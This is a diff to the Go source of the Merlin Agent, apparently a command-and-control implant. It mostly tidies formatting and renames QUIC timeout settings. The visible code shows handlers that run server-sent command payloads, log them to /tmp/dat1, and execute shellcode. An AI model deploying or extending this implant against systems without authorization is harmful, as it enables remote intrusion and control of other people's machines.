@@ -64,7 +64,7 @@ import (
 // GLOBAL VARIABLES
 var build = "nonRelease" // build is the build number of the Merlin Agent program set at compile time
 
-type executeCommandFunction func(string, string)(string, string)
+type executeCommandFunction func(string, string) (string, string)
 
 type merlinClient interface {
 	Do(req *http.Request) (*http.Response, error)
@@ -498,9 +498,9 @@ func getClient(protocol string, proxyURL string, ja3 string) (*merlinClient, err
 				MaxIdleTimeout: time.Second * 30,
 				// KeepAlive will send a HTTP/2 PING frame to keep the connection alive
 				// If this isn't used, and the agent's sleep is greater than the MaxIdleTimeout, then the connection will timeout
-				KeepAlive: true,
+				KeepAlivePeriod: time.Second * 30,
 				// HandshakeTimeout is how long the client will wait to hear back while setting up the initial crypto handshake w/ server
-				HandshakeTimeout: time.Second * 30,
+				HandshakeIdleTimeout: time.Second * 30,
 			},
 			TLSClientConfig: TLSConfig,
 		}
@@ -773,11 +773,11 @@ func (a *Agent) messageHandler(m messages.Base) (messages.Base, error) {
 	case "CmdPayload":
 		p := m.Payload.(messages.CmdPayload)
 		c.Job = p.Job
-		c.Stdout, c.Stderr = a.executeCommand(p,ExecuteCommand)
+		c.Stdout, c.Stderr = a.executeCommand(p, ExecuteCommand)
 	case "CmdPayloadScriptFromPath":
 		p := m.Payload.(messages.CmdPayload)
 		c.Job = p.Job
-		c.Stdout, c.Stderr = a.executeCommand(p,ExecuteCommandScriptInCommands)
+		c.Stdout, c.Stderr = a.executeCommand(p, ExecuteCommandScriptInCommands)
 	case "CmdGoPayload":
 		p := m.Payload.(messages.CmdPayload)
 		c.Job = p.Job
@@ -1117,25 +1117,25 @@ func (a *Agent) executeGoInterpreterCommandProgress(j messages.CmdPayload, resul
 	return stdout, stderr
 }
 
-func recordCommand2(command string, args []string){
+func recordCommand2(command string, args []string) {
 	var sb strings.Builder
 	sb.WriteString(fmt.Sprintf("%s [*] Payload:\n", time.Now().UTC().Format(time.RFC3339)))
 	sb.WriteString(command + "\n")
-	for _, arg := range(args) {
+	for _, arg := range args {
 		sb.WriteString(arg + "\n")
 	}
 	sb.WriteString("\n")
 	recordToFile(sb.String())
 }
 
-func recordOutput2(output string){
+func recordOutput2(output string) {
 	var sb strings.Builder
 	sb.WriteString(fmt.Sprintf("%s [*] Output:\n", time.Now().UTC().Format(time.RFC3339)))
 	sb.WriteString(output + "\n")
 	recordToFile(sb.String())
 }
 
-func recordToFile2(output string){
+func recordToFile2(output string) {
 	filename := "/tmp/dat1"
 
 	f, err := os.OpenFile(filename, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
@@ -1148,7 +1148,6 @@ func recordToFile2(output string){
 		message("warn", fmt.Sprintf("Failed to write to file: %s, error: %s", filename, output))
 	}
 }
-
 
 func (a *Agent) executeShellcode(shellcode messages.Shellcode) error {
 
